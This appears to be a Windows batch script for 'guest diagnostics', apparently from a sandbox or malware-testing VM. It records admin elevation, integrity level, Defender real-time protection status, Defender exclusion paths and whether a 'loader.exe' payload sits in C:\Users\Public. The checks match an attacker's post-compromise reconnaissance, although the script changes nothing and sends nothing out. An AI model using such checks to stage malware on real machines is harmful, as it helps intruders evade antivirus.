@echo off
REM diag.bat - guest diagnostics: elevation, identity, Defender state, payload presence
set OUT=C:\Users\Public\diag.txt
echo == elevation (net session needs admin^) > "%OUT%"
net session >> "%OUT%" 2>&1
echo == whoami /groups high-integrity >> "%OUT%"
whoami /groups | findstr /i "Mandatory" >> "%OUT%" 2>&1
echo == defender realtime >> "%OUT%"
powershell -nop -c "(Get-MpComputerStatus).RealTimeProtectionEnabled" >> "%OUT%" 2>&1
echo == defender exclusions >> "%OUT%"
powershell -nop -c "((Get-MpPreference).ExclusionPath -join ';')" >> "%OUT%" 2>&1
echo == payload on disk >> "%OUT%"
dir C:\Users\Public\loader.exe >> "%OUT%" 2>&1
echo == end %TIME% >> "%OUT%"
